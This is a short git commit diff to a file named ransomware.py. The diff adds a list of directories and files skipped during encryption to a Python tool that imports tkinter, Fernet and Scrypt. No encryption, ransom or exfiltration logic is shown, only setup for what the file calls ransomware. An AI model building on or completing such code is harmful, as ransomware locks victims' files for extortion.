a966df2b73ca1b1c7008a5a526cfc40b3c5c5b23
Dhirendra <sd9824721410@gmail.com>
2026-01-31 22:51:48 +0545

    add skipped file and folder

--- ransomware.py
+++ ransomware.py
@@ -1,3 +1,4 @@
+# Crucial module imports
 import os
 import base64
 import tkinter as tk
@@ -5,3 +6,9 @@ from tkinter import filedialog, messagebox
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
 from cryptography.hazmat.backends import default_backend
+
+#  skipped files and directories defining for encrption...
+SKP_DIRS = {".git", "__pycache__", "venv", "boss"}
+SKIP_FILES = {"salt.bin"}
+
+selected_files = []
